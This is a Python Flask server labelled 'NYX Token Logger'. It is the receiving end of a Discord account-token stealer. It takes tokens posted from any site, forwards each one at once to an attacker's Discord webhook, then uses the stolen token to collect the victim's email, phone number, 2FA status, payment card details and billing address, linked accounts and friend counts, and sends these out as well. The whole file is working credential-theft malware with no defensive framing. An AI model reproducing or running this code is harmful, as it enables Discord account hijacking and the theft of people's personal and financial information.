from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import threading

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'YOUR_WEBHOOK_HERE')

@app.route('/api/token', methods=['POST'])
def handle_token():
    try:
        data = request.json
        token = data.get('token', '').strip()
        
        print(f"Token received: {token[:30]}...")
        
        # Send token IMMEDIATELY
        send_token_immediately(token)
        
        # Check token in background with DETAILED info
        threading.Thread(target=check_and_send_detailed_info, args=(token,)).start()
        
        return jsonify({'status': 'processing'}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

def send_token_immediately(token):
    """Send JUST the token to Discord immediately"""
    embed = {
        'title': '🔑 TOKEN RECEIVED',
        'color': 0x7289da,
        'description': f'```{token}```',
        'fields': [
            {'name': 'Length', 'value': str(len(token)), 'inline': True},
            {'name': 'Time', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': True},
            {'name': 'Status', 'value': 'Checking details...', 'inline': True}
        ],
        'footer': {'text': 'NYX Token Logger'}
    }
    
    payload = {
        'username': 'Token Receiver',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Token sent immediately")
    except:
        print("✗ Failed to send token")

def check_and_send_detailed_info(token):
    """Check token and get ALL detailed info"""
    try:
        # First check if token is valid
        headers = {'Authorization': token}
        user_response = requests.get('https://discord.com/api/v10/users/@me', 
                                   headers=headers, timeout=10)
        
        if user_response.status_code != 200:
            send_invalid_token_info(token, f'HTTP {user_response.status_code}')
            return
        
        user_data = user_response.json()
        
        # Get ALL detailed information
        account_info = get_account_info(token, user_data)
        billing_info = get_billing_info(token)
        connections_info = get_connections_info(token)
        guilds_info = get_guilds_info(token)
        relationships_info = get_relationships_info(token)
        
        # Send detailed report
        send_detailed_report(token, account_info, billing_info, connections_info, guilds_info, relationships_info)
        
    except Exception as e:
        send_error_info(token, str(e))

def get_account_info(token, user_data):
    """Get detailed account information"""
    try:
        # Get nitro type
        nitro_type = user_data.get("premium_type", 0)
        nitro_text = "None"
        if nitro_type == 1:
            nitro_text = "Nitro Classic"
        elif nitro_type == 2:
            nitro_text = "Nitro Boost"
        elif nitro_type == 3:
            nitro_text = "Nitro Basic"
        
        # Get flags/badges
        flags = user_data.get("flags", 0)
        badges = []
        
        # Common badge flags (simplified)
        if flags & 1 << 0:
            badges.append("Discord Employee")
        if flags & 1 << 1:
            badges.append("Partnered Server Owner")
        if flags & 1 << 2:
            badges.append("HypeSquad Events")
        if flags & 1 << 3:
            badges.append("Bug Hunter Level 1")
        if flags & 1 << 6:
            badges.append("HypeSquad Bravery")
        if flags & 1 << 7:
            badges.append("HypeSquad Brilliance")
        if flags & 1 << 8:
            badges.append("HypeSquad Balance")
        if flags & 1 << 9:
            badges.append("Early Supporter")
        if flags & 1 << 10:
            badges.append("Team User")
        if flags & 1 << 14:
            badges.append("Bug Hunter Level 2")
        if flags & 1 << 16:
            badges.append("Verified Bot")
        if flags & 1 << 17:
            badges.append("Early Verified Bot Developer")
        if flags & 1 << 18:
            badges.append("Discord Certified Moderator")
        
        account_info = {
            'user_id': user_data.get("id", "Unknown"),
            'username': user_data.get("username", "Unknown"),
            'discriminator': user_data.get("discriminator", "0"),
            'global_name': user_data.get("global_name", "None"),
            'email': user_data.get("email", "No email"),
            'phone': user_data.get("phone", "None"),
            'verified': user_data.get("verified", False),
            'mfa_enabled': user_data.get("mfa_enabled", False),
            'locale': user_data.get("locale", "Unknown"),
            'nitro': nitro_text,
            'badges': ", ".join(badges) if badges else "None",
            'avatar': f'https://cdn.discordapp.com/avatars/{user_data["id"]}/{user_data.get("avatar")}.png' if user_data.get('avatar') else None,
            'banner': f'https://cdn.discordapp.com/banners/{user_data["id"]}/{user_data.get("banner")}.png' if user_data.get('banner') else None,
            'bio': user_data.get("bio", "None")
        }
        
        return account_info
        
    except Exception as e:
        print(f"Error getting account info: {e}")
        return None

def get_billing_info(token):
    """Get billing/payment information"""
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/users/@me/billing/payment-sources', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200 and response.json():
            bill_data = response.json()[0]  # Get first payment method
            billing_address = bill_data.get("billing_address", {})
            
            payment_type = bill_data.get("type", 0)
            if payment_type == 1:  # Credit Card
                billing_info = {
                    'method': 'Credit Card',
                    'brand': bill_data.get("brand", "Unknown"),
                    'last_4': bill_data.get("last_4", "****"),
                    'expires': f'{bill_data.get("expires_month", "MM")}/{bill_data.get("expires_year", "YYYY")}',
                    'holder': billing_address.get("name", "Unknown"),
                    'address1': billing_address.get("line_1", "None"),
                    'address2': billing_address.get("line_2", "None"),
                    'city': billing_address.get("city", "Unknown"),
                    'postal_code': billing_address.get("postal_code", "Unknown"),
                    'state': billing_address.get("state", "Unknown"),
                    'country': billing_address.get("country", "Unknown")
                }
            elif payment_type == 2:  # PayPal
                billing_info = {
                    'method': 'PayPal',
                    'holder': billing_address.get("name", "Unknown"),
                    'address1': billing_address.get("line_1", "None"),
                    'address2': billing_address.get("line_2", "None"),
                    'city': billing_address.get("city", "Unknown"),
                    'postal_code': billing_address.get("postal_code", "Unknown"),
                    'state': billing_address.get("state", "Unknown"),
                    'country': billing_address.get("country", "Unknown")
                }
            else:
                billing_info = {'method': 'Unknown', 'has_billing': True}
            
            return billing_info
        else:
            return {'has_billing': False}
            
    except Exception as e:
        print(f"Error getting billing info: {e}")
        return {'error': str(e)}

def get_connections_info(token):
    """Get connected accounts (Google, Steam, etc.)"""
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v10/users/@me/connections', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200:
            connections = response.json()
            if connections:
                connection_list = []
                for conn in connections[:10]:  # Limit to 10 connections
                    connection_list.append(f"{conn.get('type', 'Unknown')}: {conn.get('name', 'Unknown')}")
                return {'has_connections': True, 'connections': connection_list}
        
        return {'has_connections': False}
        
    except:
        return {'has_connections': False}

def get_guilds_info(token):
    """Get server/guild information"""
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v10/users/@me/guilds', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200:
            guilds = response.json()
            return {'guild_count': len(guilds), 'has_guilds': len(guilds) > 0}
        
        return {'has_guilds': False}
        
    except:
        return {'has_guilds': False}

def get_relationships_info(token):
    """Get friends/relationships"""
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v10/users/@me/relationships', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200:
            relationships = response.json()
            friends = [r for r in relationships if r.get('type') == 1]  # Type 1 = friend
            return {'friend_count': len(friends), 'has_friends': len(friends) > 0}
        
        return {'has_friends': False}
        
    except:
        return {'has_friends': False}

def send_detailed_report(token, account_info, billing_info, connections_info, guilds_info, relationships_info):
    """Send ALL detailed information to Discord"""
    
    # Create embeds (Discord allows up to 6000 characters total, split into multiple embeds if needed)
    
    # Embed 1: Account Information
    embed1 = {
        'title': '✅ ACCOUNT INFORMATION',
        'color': 0x00ff00,
        'thumbnail': {'url': account_info.get('avatar')} if account_info.get('avatar') else None,
        'fields': [
            {'name': '👤 User ID', 'value': f'`{account_info.get("user_id", "Unknown")}`', 'inline': True},
            {'name': '📛 Username', 'value': f'{account_info.get("username", "Unknown")}#{account_info.get("discriminator", "0")}', 'inline': True},
            {'name': '🌐 Global Name', 'value': account_info.get("global_name", "None"), 'inline': True},
            {'name': '📧 Email', 'value': account_info.get("email", "No email"), 'inline': True},
            {'name': '📱 Phone', 'value': account_info.get("phone", "None"), 'inline': True},
            {'name': '✅ Verified', 'value': 'Yes' if account_info.get("verified") else 'No', 'inline': True},
            {'name': '🔐 2FA', 'value': 'Enabled' if account_info.get("mfa_enabled") else 'Disabled', 'inline': True},
            {'name': '💎 Nitro', 'value': account_info.get("nitro", "None"), 'inline': True},
            {'name': '🌍 Locale', 'value': account_info.get("locale", "Unknown"), 'inline': True},
            {'name': '🎖️ Badges', 'value': account_info.get("badges", "None"), 'inline': False},
            {'name': '📝 Bio', 'value': account_info.get("bio", "None")[:100] + ("..." if len(account_info.get("bio", "")) > 100 else ""), 'inline': False}
        ]
    }
    
    # Embed 2: Billing Information
    embed2_fields = []
    
    if billing_info.get('has_billing'):
        if billing_info.get('method') == 'Credit Card':
            embed2_fields = [
                {'name': '💳 Payment Method', 'value': 'Credit Card', 'inline': True},
                {'name': '🏦 Brand', 'value': billing_info.get('brand', 'Unknown'), 'inline': True},
                {'name': '🔢 Last 4', 'value': billing_info.get('last_4', '****'), 'inline': True},
                {'name': '📅 Expires', 'value': billing_info.get('expires', 'Unknown'), 'inline': True},
                {'name': '👤 Card Holder', 'value': billing_info.get('holder', 'Unknown'), 'inline': False},
                {'name': '📍 Address', 'value': f'{billing_info.get("address1", "None")}\n{billing_info.get("address2", "")}'.strip(), 'inline': False},
                {'name': '🏙️ City', 'value': billing_info.get('city', 'Unknown'), 'inline': True},
                {'name': '📮 Postal Code', 'value': billing_info.get('postal_code', 'Unknown'), 'inline': True},
                {'name': '🗺️ State/Country', 'value': f'{billing_info.get("state", "Unknown")}, {billing_info.get("country", "Unknown")}', 'inline': True}
            ]
        elif billing_info.get('method') == 'PayPal':
            embed2_fields = [
                {'name': '💳 Payment Method', 'value': 'PayPal', 'inline': True},
                {'name': '👤 PayPal Holder', 'value': billing_info.get('holder', 'Unknown'), 'inline': False},
                {'name': '📍 Address', 'value': f'{billing_info.get("address1", "None")}\n{billing_info.get("address2", "")}'.strip(), 'inline': False},
                {'name': '🏙️ City', 'value': billing_info.get('city', 'Unknown'), 'inline': True},
                {'name': '📮 Postal Code', 'value': billing_info.get('postal_code', 'Unknown'), 'inline': True},
                {'name': '🗺️ State/Country', 'value': f'{billing_info.get("state", "Unknown")}, {billing_info.get("country", "Unknown")}', 'inline': True}
            ]
    else:
        embed2_fields = [{'name': '💳 Billing Info', 'value': 'No billing information found', 'inline': False}]
    
    embed2 = {
        'title': '💰 BILLING INFORMATION',
        'color': 0xffaa00,
        'fields': embed2_fields
    }
    
    # Embed 3: Connections & Stats
    embed3_fields = []
    
    if guilds_info.get('has_guilds'):
        embed3_fields.append({'name': '🏰 Servers', 'value': str(guilds_info.get('guild_count', 0)), 'inline': True})
    
    if relationships_info.get('has_friends'):
        embed3_fields.append({'name': '👥 Friends', 'value': str(relationships_info.get('friend_count', 0)), 'inline': True})
    
    if connections_info.get('has_connections'):
        connections_text = '\n'.join(connections_info.get('connections', [])[:5])
        if len(connections_info.get('connections', [])) > 5:
            connections_text += f'\n...and {len(connections_info.get("connections", [])) - 5} more'
        embed3_fields.append({'name': '🔗 Connected Accounts', 'value': connections_text, 'inline': False})
    else:
        embed3_fields.append({'name': '🔗 Connected Accounts', 'value': 'None', 'inline': True})
    
    embed3_fields.append({'name': '⏰ Checked At', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': False})
    
    embed3 = {
        'title': '📊 STATISTICS & CONNECTIONS',
        'color': 0x9b59b6,
        'fields': embed3_fields
    }
    
    # Send all embeds
    payload = {
        'username': 'Token Analyzer',
        'avatar_url': 'https://cdn.discordapp.com/attachments/123456789012345678/123456789012345678/nyx_logo.png',
        'embeds': [embed1, embed2, embed3]
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        if response.status_code in [200, 204]:
            print("✓ Detailed report sent successfully")
        else:
            print(f"✗ Failed to send report: HTTP {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending report: {e}")

def send_invalid_token_info(token, error_msg):
    """Send info for invalid token"""
    embed = {
        'title': '❌ TOKEN INVALID',
        'color': 0xff0000,
        'description': f'Token check failed',
        'fields': [
            {'name': 'Error', 'value': error_msg, 'inline': False},
            {'name': 'Token', 'value': f'```{token[:50]}...```', 'inline': False}
        ]
    }
    
    payload = {
        'username': 'Token Analyzer',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Invalid token info sent")
    except:
        print("✗ Failed to send invalid token info")

def send_error_info(token, error_msg):
    """Send error info"""
    embed = {
        'title': '⚠️ CHECK ERROR',
        'color': 0xffaa00,
        'description': f'Error checking token',
        'fields': [
            {'name': 'Error', 'value': error_msg[:1000], 'inline': False},
            {'name': 'Token', 'value': f'```{token[:30]}...```', 'inline': False}
        ]
    }
    
    payload = {
        'username': 'Token Analyzer - Error',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

@app.route('/')
def home():
    return jsonify({'status': 'running', 'message': 'Token analyzer API'})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'healthy'}), 200

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
